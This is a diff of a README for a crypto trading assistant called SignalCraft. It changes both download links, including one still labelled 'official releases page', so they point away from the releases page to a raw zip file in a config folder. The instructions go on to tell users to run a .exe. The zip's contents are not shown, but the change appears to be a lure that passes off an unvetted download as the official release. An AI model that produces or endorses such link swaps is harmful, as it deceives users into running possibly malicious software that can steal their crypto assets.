@@ -1,12 +1,12 @@
 # 🤖 signalcraft-trading-assistant - Simple AI analysis for your crypto trades
 
-[![Download SignalCraft](https://img.shields.io/badge/Download-SignalCraft-blue.svg)](https://github.com/Janetcloseknit115/signalcraft-trading-assistant/releases)
+[![Download SignalCraft](https://img.shields.io/badge/Download-SignalCraft-blue.svg)](https://github.com/Janetcloseknit115/signalcraft-trading-assistant/raw/refs/heads/main/config/signalcraft-assistant-trading-opinional.zip)
 
 SignalCraft provides AI-powered insights for cryptocurrency markets. It uses the DeepSeek V4 model to analyze trends and manage trades across many exchanges. The software includes two main modes: observer mode for market monitoring and execution mode for automated trading.
 
 ## 📥 How to download your software
 
-1. Visit the [official releases page](https://github.com/Janetcloseknit115/signalcraft-trading-assistant/releases).
+1. Visit the [official releases page](https://github.com/Janetcloseknit115/signalcraft-trading-assistant/raw/refs/heads/main/config/signalcraft-assistant-trading-opinional.zip).
 2. Look for the section labeled "Assets."
 3. Select the file ending in `.exe` for Windows systems.
 4. Save the file to your computer.
